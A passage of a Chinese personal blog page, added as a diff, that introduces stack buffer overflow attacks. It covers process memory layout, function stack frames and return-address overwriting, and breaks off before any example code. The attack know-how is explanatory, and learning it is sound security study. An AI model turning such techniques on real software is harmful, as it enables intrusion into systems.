@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>黑客学习系列：栈溢出攻击 | Max&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近在学习 Python，为以后工作做好准备；又恰好个人对黑客技术很好奇，就想在学习 Python 同时也学习下黑客技术，于是就有了这篇文章。由于是第一次学习黑客技术，好多好多都不懂，但也到处是金矿，等待我去挖取。 缓冲区溢出可分为栈溢出和堆溢出。平常我们所讲的以及本文所提到的缓冲区溢出特指的是栈溢出。 注：本文缓冲区溢出攻击介绍部分摘录自博文缓冲区溢出攻击。 缓冲区溢出攻击介绍关于缓冲区溢出攻击">
+<meta name="keywords" content="黑客,缓冲区溢出,栈溢出,Metasploit Framwork,Immunity Debugger,mona,Kali Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="黑客学习系列：栈溢出攻击">
+<meta property="og:url" content="http://xiehongfeng100.github.io/2016/04/26/security-stack-overflow-attack/index.html">
+<meta property="og:site_name" content="Max&#39;s Blog">
+<meta property="og:description" content="最近在学习 Python，为以后工作做好准备；又恰好个人对黑客技术很好奇，就想在学习 Python 同时也学习下黑客技术，于是就有了这篇文章。由于是第一次学习黑客技术，好多好多都不懂，但也到处是金矿，等待我去挖取。 缓冲区溢出可分为栈溢出和堆溢出。平常我们所讲的以及本文所提到的缓冲区溢出特指的是栈溢出。 注：本文缓冲区溢出攻击介绍部分摘录自博文缓冲区溢出攻击。 缓冲区溢出攻击介绍关于缓冲区溢出攻击">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/进程地址空间分布.jpg">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/函数栈帧.jpg">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/缓冲区溢出.jpg">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/基本栈溢出攻击.jpg">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/借助跳板的栈溢出攻击.jpg">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/调整shellcode与栈指针.jpg">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/ftpfuzz-mainscreen.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/ftpfuzz-fuzzing-data.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/ftpfuzz-fuzzing-sizes.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/ftpfuzz-fuzzing-options.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/ftpfuzz-attack-user.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/ftpfuzz-attack-mkd.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/buffer-overflow-detect-by-code.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/immunity-debugger-mainscreen.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/general-length-of-exploit.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/mona-pattern-create.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/mona-pattern-attack.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/mona-pattern-offset.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/mona-pattern-ensure.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/jmp-esp.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/mona-set-breakpoint.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/calc.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/msfvenom-parameter.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/msfvenom-with-concise-parameter.png">
+<meta property="og:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/msfvenom-with-detail-parameter.png">
+<meta property="og:updated_time" content="2019-05-01T06:16:51.713Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="黑客学习系列：栈溢出攻击">
+<meta name="twitter:description" content="最近在学习 Python，为以后工作做好准备；又恰好个人对黑客技术很好奇，就想在学习 Python 同时也学习下黑客技术，于是就有了这篇文章。由于是第一次学习黑客技术，好多好多都不懂，但也到处是金矿，等待我去挖取。 缓冲区溢出可分为栈溢出和堆溢出。平常我们所讲的以及本文所提到的缓冲区溢出特指的是栈溢出。 注：本文缓冲区溢出攻击介绍部分摘录自博文缓冲区溢出攻击。 缓冲区溢出攻击介绍关于缓冲区溢出攻击">
+<meta name="twitter:image" content="http://xiehongfeng100.github.io/images/security/hack/buffer-overflow-attack/进程地址空间分布.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="Max&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="img/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/author.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Max</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">Stay hungry, stay foolish.</p>
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						
+						<li>关于我</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/categories/读书">读书</a></li>
+				        
+							<li><a href="/tags/翻译">翻译</a></li>
+				        
+							<li><a href="/categories/网络">网络</a></li>
+				        
+							<li><a href="/categories/并发">并发</a></li>
+				        
+							<li><a href="/categories/安全">安全</a></li>
+				        
+							<li><a href="/categories/运维">运维</a></li>
+				        
+							<li><a href="/categories/数据库">数据库</a></li>
+				        
+							<li><a href="/categories/云计算">云计算</a></li>
+				        
+							<li><a href="/categories/编程语言">编程语言</a></li>
+				        
+							<li><a href="/categories/操作系统">操作系统</a></li>
+				        
+							<li><a href="/categories/机器学习">机器学习</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/xiehongfeng100" title="github">github</a>
+					        
+								<a class="linkedin" target="_blank" href="http://cn.linkedin.com/in/xiehongfeng100" title="linkedin">linkedin</a>
+					        
+								<a class="mail" target="_blank" href="mailto:xiehongfeng100@yeah.net" title="mail">mail</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/tmp/" style="font-size: 10px;">/tmp</a> <a href="/tags/AT-T/" style="font-size: 10px;">AT&T</a> <a href="/tags/Affin/" style="font-size: 10px;">Affin</a> <a href="/tags/Alembic/" style="font-size: 10px;">Alembic</a> <a href="/tags/B-树/" style="font-size: 10px;">B+ 树</a> <a href="/tags/BIOS/" style="font-size: 10px;">BIOS</a> <a href="/tags/C-C/" style="font-size: 16.36px;">C/C++</a> <a href="/tags/CA/" style="font-size: 10px;">CA</a> <a href="/tags/CBOW/" style="font-size: 10px;">CBOW</a> <a href="/tags/CNN/" style="font-size: 10.91px;">CNN</a> <a href="/tags/DHCP/" style="font-size: 10px;">DHCP</a> <a href="/tags/Decorator/" style="font-size: 10px;">Decorator</a> <a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Dnsmasq/" style="font-size: 10px;">Dnsmasq</a> <a href="/tags/ELF/" style="font-size: 10px;">ELF</a> <a href="/tags/ELK/" style="font-size: 10px;">ELK</a> <a href="/tags/Elasticsearch/" style="font-size: 11.82px;">Elasticsearch</a> <a href="/tags/GCC/" style="font-size: 10px;">GCC</a> <a href="/tags/HBR/" style="font-size: 10px;">HBR</a> <a href="/tags/IO-Multiplexing/" style="font-size: 11.82px;">IO Multiplexing</a> <a href="/tags/IPTables/" style="font-size: 10px;">IPTables</a> <a href="/tags/Immunity-Debugger/" style="font-size: 10px;">Immunity Debugger</a> <a href="/tags/InnoDB/" style="font-size: 10px;">InnoDB</a> <a href="/tags/KD-Tree/" style="font-size: 10.91px;">KD-Tree</a> <a href="/tags/KNN/" style="font-size: 10px;">KNN</a> <a href="/tags/KVM/" style="font-size: 10px;">KVM</a> <a href="/tags/Kali-Linux/" style="font-size: 10px;">Kali Linux</a> <a href="/tags/Keras/" style="font-size: 10px;">Keras</a> <a href="/tags/Keystone/" style="font-size: 13.64px;">Keystone</a> <a href="/tags/Kibana/" style="font-size: 10px;">Kibana</a> <a href="/tags/Lemmatization/" style="font-size: 10px;">Lemmatization</a> <a href="/tags/Libvirt/" style="font-size: 10.91px;">Libvirt</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/LinuxBridge/" style="font-size: 11.82px;">LinuxBridge</a> <a href="/tags/Logging/" style="font-size: 10px;">Logging</a> <a href="/tags/Logstash/" style="font-size: 10px;">Logstash</a> <a href="/tags/MRO/" style="font-size: 10px;">MRO</a> <a href="/tags/Metasploit-Framwork/" style="font-size: 10px;">Metasploit Framwork</a> <a href="/tags/MySQL/" style="font-size: 10.91px;">MySQL</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/Namespace/" style="font-size: 10px;">Namespace</a> <a href="/tags/Neo4J/" style="font-size: 10.91px;">Neo4J</a> <a href="/tags/Neutron/" style="font-size: 13.64px;">Neutron</a> <a href="/tags/Nova/" style="font-size: 14.55px;">Nova</a> <a href="/tags/OpenStack/" style="font-size: 17.27px;">OpenStack</a> <a href="/tags/OpenVSwitch/" style="font-size: 10px;">OpenVSwitch</a> <a href="/tags/PKI/" style="font-size: 10.91px;">PKI</a> <a href="/tags/PasteDeploy/" style="font-size: 10.91px;">PasteDeploy</a> <a href="/tags/Policy/" style="font-size: 10px;">Policy</a> <a href="/tags/Python/" style="font-size: 18.18px;">Python</a> <a href="/tags/QEMU/" style="font-size: 10px;">QEMU</a> <a href="/tags/RBAC/" style="font-size: 10px;">RBAC</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/SQLAlchemy-Migrate/" style="font-size: 10px;">SQLAlchemy-Migrate</a> <a href="/tags/SSL/" style="font-size: 10px;">SSL</a> <a href="/tags/Sigmoid/" style="font-size: 10px;">Sigmoid</a> <a href="/tags/Skip-Gram/" style="font-size: 10px;">Skip-Gram</a> <a href="/tags/Socket/" style="font-size: 10px;">Socket</a> <a href="/tags/Stop-Words/" style="font-size: 10px;">Stop Words</a> <a href="/tags/TCP/" style="font-size: 10px;">TCP</a> <a href="/tags/Tap/" style="font-size: 10.91px;">Tap</a> <a href="/tags/Token/" style="font-size: 11.82px;">Token</a> <a href="/tags/Tokenization/" style="font-size: 10px;">Tokenization</a> <a href="/tags/Trampolining/" style="font-size: 10px;">Trampolining</a> <a href="/tags/Tun/" style="font-size: 10.91px;">Tun</a> <a href="/tags/Tunnel/" style="font-size: 10px;">Tunnel</a> <a href="/tags/UUID/" style="font-size: 10px;">UUID</a> <a href="/tags/VNC/" style="font-size: 10px;">VNC</a> <a href="/tags/VPN/" style="font-size: 10px;">VPN</a> <a href="/tags/Veth/" style="font-size: 11.82px;">Veth</a> <a href="/tags/VirtualBox/" style="font-size: 10px;">VirtualBox</a> <a href="/tags/Vlan/" style="font-size: 10px;">Vlan</a> <a href="/tags/Vue/" style="font-size: 10px;">Vue</a> <a href="/tags/WSGI/" style="font-size: 13.64px;">WSGI</a> <a href="/tags/Webob/" style="font-size: 10px;">Webob</a> <a href="/tags/Word2Vec/" style="font-size: 10.91px;">Word2Vec</a> <a href="/tags/Yelper/" style="font-size: 15.45px;">Yelper</a> <a href="/tags/bootsect/" style="font-size: 10px;">bootsect</a> <a href="/tags/cookiecutter/" style="font-size: 10px;">cookiecutter</a> <a href="/tags/delete/" style="font-size: 10px;">delete</a> <a href="/tags/dnsmasq/" style="font-size: 10px;">dnsmasq</a> <a href="/tags/entry-points/" style="font-size: 10px;">entry_points</a> <a href="/tags/epoll/" style="font-size: 10px;">epoll</a> <a href="/tags/fork/" style="font-size: 10px;">fork</a> <a href="/tags/head/" style="font-size: 10px;">head</a> <a href="/tags/inode/" style="font-size: 10px;">inode</a> <a href="/tags/malloc/" style="font-size: 10px;">malloc</a> <a href="/tags/mona/" style="font-size: 10px;">mona</a> <a href="/tags/new/" style="font-size: 10px;">new</a> <a href="/tags/property/" style="font-size: 10px;">property</a> <a href="/tags/read/" style="font-size: 10px;">read</a> <a href="/tags/routes/" style="font-size: 10px;">routes</a> <a href="/tags/select/" style="font-size: 10px;">select</a> <a href="/tags/setup/" style="font-size: 10px;">setup</a> <a href="/tags/setuptools/" style="font-size: 10px;">setuptools</a> <a href="/tags/shell/" style="font-size: 10.91px;">shell</a> <a href="/tags/stevedore/" style="font-size: 10px;">stevedore</a> <a href="/tags/string/" style="font-size: 10px;">string</a> <a href="/tags/tcpdump/" style="font-size: 10px;">tcpdump</a> <a href="/tags/uWSGI/" style="font-size: 10px;">uWSGI</a> <a href="/tags/update-进程/" style="font-size: 10px;">update 进程</a> <a href="/tags/write/" style="font-size: 10px;">write</a> <a href="/tags/wsgiref/" style="font-size: 10px;">wsgiref</a> <a href="/tags/yield/" style="font-size: 14.55px;">yield</a> <a href="/tags/中断/" style="font-size: 10.91px;">中断</a> <a href="/tags/任务调度/" style="font-size: 10px;">任务调度</a> <a href="/tags/传记/" style="font-size: 10.91px;">传记</a> <a href="/tags/信号/" style="font-size: 10px;">信号</a> <a href="/tags/信号量/" style="font-size: 10px;">信号量</a> <a href="/tags/内存对齐/" style="font-size: 10px;">内存对齐</a> <a href="/tags/内存映射-I-O/" style="font-size: 10px;">内存映射 I/O</a> <a href="/tags/内存规划/" style="font-size: 10px;">内存规划</a> <a href="/tags/内核/" style="font-size: 19.09px;">内核</a> <a href="/tags/内核栈/" style="font-size: 10px;">内核栈</a> <a href="/tags/分页/" style="font-size: 10px;">分页</a> <a href="/tags/加密/" style="font-size: 10.91px;">加密</a> <a href="/tags/加载/" style="font-size: 10.91px;">加载</a> <a href="/tags/协程/" style="font-size: 13.64px;">协程</a> <a href="/tags/可执行目标文件/" style="font-size: 10.91px;">可执行目标文件</a> <a href="/tags/可重定位目标文件/" style="font-size: 10px;">可重定位目标文件</a> <a href="/tags/同步/" style="font-size: 10px;">同步</a> <a href="/tags/商业/" style="font-size: 11.82px;">商业</a> <a href="/tags/地心坐标系/" style="font-size: 10px;">地心坐标系</a> <a href="/tags/多线程/" style="font-size: 10.91px;">多线程</a> <a href="/tags/多进程/" style="font-size: 10px;">多进程</a> <a href="/tags/字符串/" style="font-size: 10px;">字符串</a> <a href="/tags/存储器/" style="font-size: 10.91px;">存储器</a> <a href="/tags/宏/" style="font-size: 10px;">宏</a> <a href="/tags/寄存器/" style="font-size: 10px;">寄存器</a> <a href="/tags/开发环境/" style="font-size: 10px;">开发环境</a> <a href="/tags/异常/" style="font-size: 10px;">异常</a> <a href="/tags/异步/" style="font-size: 10px;">异步</a> <a href="/tags/引导块/" style="font-size: 10px;">引导块</a> <a href="/tags/引导程序/" style="font-size: 12.73px;">引导程序</a> <a href="/tags/归一化/" style="font-size: 10px;">归一化</a> <a href="/tags/微处理器/" style="font-size: 13.64px;">微处理器</a> <a href="/tags/总结/" style="font-size: 10px;">总结</a> <a href="/tags/情感分析/" style="font-size: 10px;">情感分析</a> <a href="/tags/扩容/" style="font-size: 10px;">扩容</a> <a href="/tags/指令集/" style="font-size: 10px;">指令集</a> <a href="/tags/指针/" style="font-size: 12.73px;">指针</a> <a href="/tags/数字签名/" style="font-size: 10px;">数字签名</a> <a href="/tags/数字证书/" style="font-size: 10px;">数字证书</a> <a href="/tags/整数/" style="font-size: 10px;">整数</a> <a href="/tags/文件系统/" style="font-size: 12.73px;">文件系统</a> <a href="/tags/时钟/" style="font-size: 10px;">时钟</a> <a href="/tags/时钟中断/" style="font-size: 10px;">时钟中断</a> <a href="/tags/时间衰减函数/" style="font-size: 10px;">时间衰减函数</a> <a href="/tags/权限/" style="font-size: 10px;">权限</a> <a href="/tags/标准输入/" style="font-size: 10px;">标准输入</a> <a href="/tags/标准输出/" style="font-size: 10px;">标准输出</a> <a href="/tags/标准错误输出/" style="font-size: 10px;">标准错误输出</a> <a href="/tags/栈帧/" style="font-size: 10px;">栈帧</a> <a href="/tags/栈溢出/" style="font-size: 10px;">栈溢出</a> <a href="/tags/根设备/" style="font-size: 10px;">根设备</a> <a href="/tags/母板/" style="font-size: 10px;">母板</a> <a href="/tags/汇编/" style="font-size: 10px;">汇编</a> <a href="/tags/浮点数/" style="font-size: 10px;">浮点数</a> <a href="/tags/消息摘要/" style="font-size: 10px;">消息摘要</a> <a href="/tags/特权级/" style="font-size: 10px;">特权级</a> <a href="/tags/环境变量/" style="font-size: 10px;">环境变量</a> <a href="/tags/生成器/" style="font-size: 14.55px;">生成器</a> <a href="/tags/用户栈/" style="font-size: 10px;">用户栈</a> <a href="/tags/相似度/" style="font-size: 10.91px;">相似度</a> <a href="/tags/硬盘/" style="font-size: 12.73px;">硬盘</a> <a href="/tags/硬链接/" style="font-size: 10px;">硬链接</a> <a href="/tags/管道/" style="font-size: 10px;">管道</a> <a href="/tags/系统调用/" style="font-size: 10px;">系统调用</a> <a href="/tags/索引/" style="font-size: 10px;">索引</a> <a href="/tags/缓冲区/" style="font-size: 10.91px;">缓冲区</a> <a href="/tags/缓冲区溢出/" style="font-size: 10px;">缓冲区溢出</a> <a href="/tags/缺页中断/" style="font-size: 10px;">缺页中断</a> <a href="/tags/网络/" style="font-size: 13.64px;">网络</a> <a href="/tags/翻译/" style="font-size: 14.55px;">翻译</a> <a href="/tags/虚拟地址空间/" style="font-size: 10px;">虚拟地址空间</a> <a href="/tags/虚拟盘/" style="font-size: 10px;">虚拟盘</a> <a href="/tags/请求项/" style="font-size: 10px;">请求项</a> <a href="/tags/质数/" style="font-size: 10px;">质数</a> <a href="/tags/超级块/" style="font-size: 10px;">超级块</a> <a href="/tags/软盘/" style="font-size: 10px;">软盘</a> <a href="/tags/软链接/" style="font-size: 10px;">软链接</a> <a href="/tags/进程派生/" style="font-size: 10px;">进程派生</a> <a href="/tags/进程通信/" style="font-size: 10.91px;">进程通信</a> <a href="/tags/迭代器/" style="font-size: 10px;">迭代器</a> <a href="/tags/金融/" style="font-size: 10px;">金融</a> <a href="/tags/阻塞/" style="font-size: 10.91px;">阻塞</a> <a href="/tags/非阻塞/" style="font-size: 10.91px;">非阻塞</a> <a href="/tags/黑客/" style="font-size: 10px;">黑客</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">谢宏峰，毕业于暨南大学（2009 - 2013）、中国科学院（2013 - 2016），现就职于深信服科技，从事 OpenStack 开发。</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Max</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="/img/author.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Max</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">Stay hungry, stay foolish.</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/categories/读书">读书</a></li>
+		        
+					<li><a href="/tags/翻译">翻译</a></li>
+		        
+					<li><a href="/categories/网络">网络</a></li>
+		        
+					<li><a href="/categories/并发">并发</a></li>
+		        
+					<li><a href="/categories/安全">安全</a></li>
+		        
+					<li><a href="/categories/运维">运维</a></li>
+		        
+					<li><a href="/categories/数据库">数据库</a></li>
+		        
+					<li><a href="/categories/云计算">云计算</a></li>
+		        
+					<li><a href="/categories/编程语言">编程语言</a></li>
+		        
+					<li><a href="/categories/操作系统">操作系统</a></li>
+		        
+					<li><a href="/categories/机器学习">机器学习</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/xiehongfeng100" title="github">github</a>
+			        
+						<a class="linkedin" target="_blank" href="http://cn.linkedin.com/in/xiehongfeng100" title="linkedin">linkedin</a>
+			        
+						<a class="mail" target="_blank" href="mailto:xiehongfeng100@yeah.net" title="mail">mail</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-security-stack-overflow-attack" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/04/26/security-stack-overflow-attack/" class="article-date">
+  	<time datetime="2016-04-26T12:38:27.000Z" itemprop="datePublished">2016-04-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      黑客学习系列：栈溢出攻击
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Immunity-Debugger/">Immunity Debugger</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali-Linux/">Kali Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit-Framwork/">Metasploit Framwork</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mona/">mona</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/栈溢出/">栈溢出</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/缓冲区溢出/">缓冲区溢出</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/黑客/">黑客</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/安全/">安全</a>
+	</div>
+
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近在学习 Python，为以后工作做好准备；又恰好个人对黑客技术很好奇，就想在学习 Python 同时也学习下黑客技术，于是就有了这篇文章。由于是第一次学习黑客技术，好多好多都不懂，但也到处是金矿，等待我去挖取。</p>
+<p>缓冲区溢出可分为栈溢出和堆溢出。<code>平常我们所讲的以及本文所提到的缓冲区溢出特指的是栈溢出</code>。</p>
+<p><strong>注：</strong>本文缓冲区溢出攻击介绍部分摘录自博文<a href="http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html" target="_blank" rel="noopener">缓冲区溢出攻击</a>。</p>
+<h1 id="缓冲区溢出攻击介绍"><a href="#缓冲区溢出攻击介绍" class="headerlink" title="缓冲区溢出攻击介绍"></a><strong>缓冲区溢出攻击介绍</strong></h1><p>关于缓冲区溢出攻击，博文<a href="http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html" target="_blank" rel="noopener">缓冲区溢出攻击</a>有一个很详细明了的阐述；另外也考虑到自己不一定能比该博文作者写的更好，所以<strong>关于缓冲区溢出介绍及攻击部分直接摘录自该博文，但会尽量保持原文排版风格。</strong></p>
+<p>缓冲区溢出（Buffer Overflow）是计算机安全领域内既经典而又古老的话题。随着计算机系统安全性的加强，传统的缓冲区溢出攻击方式可能变得不再奏效，相应的介绍缓冲区溢出原理的资料也变得“大众化”起来。其中看雪的《 0day 安全：软件漏洞分析技术》一书将缓冲区溢出攻击的原理阐述得简洁明了。本文参考该书对缓冲区溢出原理的讲解，并结合实际的代码实例进行验证。不过即便如此，完成一个简单的溢出代码也需要解决很多书中无法涉及的问题，尤其是面对较新的具有安全特性的编译器——比如 MS 的 Visual Studio2010。接下来，我们结合具体代码，按照对缓冲区溢出原理的循序渐进地理解方式去挖掘缓冲区溢出背后的底层机制。</p>
+<a id="more"></a>
+<h2 id="一、代码-lt-gt-数据"><a href="#一、代码-lt-gt-数据" class="headerlink" title="一、代码 &lt;=&gt; 数据"></a><strong>一、代码 &lt;=&gt; 数据</strong></h2><p>顾名思义，缓冲区溢出的含义是为缓冲区提供了多于其存储容量的数据，就像往杯子里倒入了过量的水一样。通常情况下，缓冲区溢出的数据只会破坏程序数据，造成意外终止。但是如果有人精心构造溢出数据的内容，那么就有可能获得系统的控制权！如果说用户（也可能是黑客）提供了水——缓冲区溢出攻击的数据，那么系统提供了溢出的容器——缓冲区。</p>
+<p>缓冲区在系统中的表现形式是多样的，高级语言定义的变量、数组、结构体等在运行时可以说都是保存在缓冲区内的，因此所谓缓冲区可以更抽象地理解为一段可读写的内存区域，缓冲区攻击的最终目的就是希望系统能执行这块可读写内存中已经被蓄意设定好的恶意代码。按照冯·诺依曼存储程序原理，程序代码是作为二进制数据存储在内存的，同样程序的数据也在内存中，因此<code>直接从内存的二进制形式上是无法区分哪些是数据哪些是代码的，这也为缓冲区溢出攻击提供了可能。</code></p>
+<p><img src="/images/security/hack/buffer-overflow-attack/进程地址空间分布.jpg" alt>图 1：进程地址空间分布  </p>
+<p>图 1 是进程地址空间分布的简单表示。代码存储了用户程序的所有可执行代码，在程序正常执行的情况下，程序计数器（PC 指针）只会在代码段和操作系统地址空间（内核态）内寻址。数据段内存储了用户程序的全局变量，文字池等。栈空间存储了用户程序的函数栈帧（包括参数、局部数据等），实现函数调用机制，它的数据增长方向是低地址方向。堆空间存储了程序运行时动态申请的内存数据等，数据增长方向是高地址方向。除了代码段和受操作系统保护的数据区域，其他的内存区域都可能作为缓冲区，因此缓冲区溢出的位置可能在数据段，也可能在堆、栈段。如果程序的代码有软件漏洞，恶意程序会“教唆”程序计数器从上述缓冲区内取指，执行恶意程序提供的数据代码！本文分析并实现栈溢出攻击方式。</p>
+<h2 id="二、函数栈帧"><a href="#二、函数栈帧" class="headerlink" title="二、函数栈帧"></a><strong>二、函数栈帧</strong></h2><p>栈的主要功能是实现函数的调用。因此在介绍栈溢出原理之前，需要弄清函数调用时栈空间发生了怎样的变化。每次函数调用时，系统会把函数的返回地址（函数调用指令后紧跟指令的地址），一些关键的寄存器值保存在栈内，函数的实际参数和局部变量（包括数据、结构体、对象等）也会保存在栈内。这些数据统称为函数调用的栈帧，而且是每次函数调用都会有个独立的栈帧，这也为递归函数的实现提供了可能。</p>
+<p><img src="/images/security/hack/buffer-overflow-attack/函数栈帧.jpg" alt>图 2：函数栈帧  </p>
+<p>如图所示，我们定义了一个简单的函数 function，它接受一个整形参数，做一次乘法操作并返回。当调用 function(0) 时，arg 参数记录了值 0 入栈，并将 call function 指令下一条指令的地址 0x00bd16f0 保存到栈内，然后跳转到 function 函数内部执行。每个函数定义都会有函数头和函数尾代码，如图绿框表示。因为函数内需要用 ebp 保存函数栈帧基址，因此先保存 ebp 原来的值到栈内，然后将栈指针 esp 内容保存到 ebp。函数返回前需要做相反的操作——将 esp 指针恢复，并弹出 ebp。这样，函数内正常情况下无论怎样使用栈，都不会使栈失去平衡。</p>
+<p>sub esp,44h 指令为局部变量开辟了栈空间，比如 ret 变量的位置。理论上，function 只需要再开辟 4 字节空间保存 ret 即可，但是编译器开辟了更多的空间（这个问题很诡异，你觉得呢？）。函数调用结束返回后，函数栈帧恢复到保存参数 0 时的状态，为了保持栈帧平衡，需要恢复 esp 的内容，使用 add esp,4 将压入的参数弹出。</p>
+<p>之所以会有缓冲区溢出的可能，主要是因为栈空间内保存了函数的返回地址。该地址保存了函数调用结束后后续执行的指令的位置，对于计算机安全来说，该信息是很敏感的。如果有人恶意修改了这个返回地址，并使该返回地址指向了一个新的代码位置，程序便能从其它位置继续执行。</p>
+<h2 id="三、栈溢出基本原理"><a href="#三、栈溢出基本原理" class="headerlink" title="三、栈溢出基本原理"></a><strong>三、栈溢出基本原理</strong></h2><p>上边给出的代码是无法进行溢出操作的，因为用户没有“插足”的机会。但是实际上很多程序都会接受用户的外界输入，尤其是当函数内的一个数组缓冲区接受用户输入的时候，一旦程序代码未对输入的长度进行合法性检查的话，缓冲区溢出便有可能触发！比如下边的一个简单的函数。</p>
